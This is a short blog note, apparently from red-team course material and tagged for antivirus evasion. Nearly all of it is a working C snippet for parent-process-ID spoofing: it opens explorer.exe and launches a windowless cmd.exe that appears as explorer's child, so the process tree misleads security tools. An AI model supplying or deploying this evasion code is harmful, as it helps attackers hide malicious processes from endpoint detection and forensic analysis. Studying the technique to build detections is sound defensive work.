---
title: Parent Process ID Spoofing
published: 2026-04-24
tags: [Markdown, AntiVirus-Evasion, Malware, Anti-Analysis]
category: AntiVirus-Evasion
draft: false
---


Source: https://courses.redteamleaders.com/courses/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/take/67---spoofed-ppid-parent-process-id-spoofing

Use ```UpdateProcThreadAttribute``` with ```PROC_THREAD_ATTRIBUTE_PARENT_PROCESS``` flag to change parent process of target created process



```c title="PPID_Spoofing.c"

// Source: https://courses.redteamleaders.com/courses/3e9e0212-81dc-49ed-9233-ec9ca894fc6a/take/67---spoofed-ppid-parent-process-id-spoofing

DWORD parentPid = FindProcessId(L"explorer.exe");

HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);

STARTUPINFOEXA si = { 0 };
PROCESS_INFORMATION pi = { 0 };
SIZE_T attrSize = 0;
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);

InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
UpdateProcThreadAttribute(
    si.lpAttributeList,
    0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    &hParent,
    sizeof(HANDLE),
    NULL,
    NULL
);

char cmdLine[] = "C:\\Windows\\System32\\cmd.exe";

CreateProcessA(
    NULL,
    cmdLine,
    NULL,
    NULL,
    FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
    NULL,
    NULL,
    &si.StartupInfo,
    &pi);

DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
CloseHandle(hParent);
```

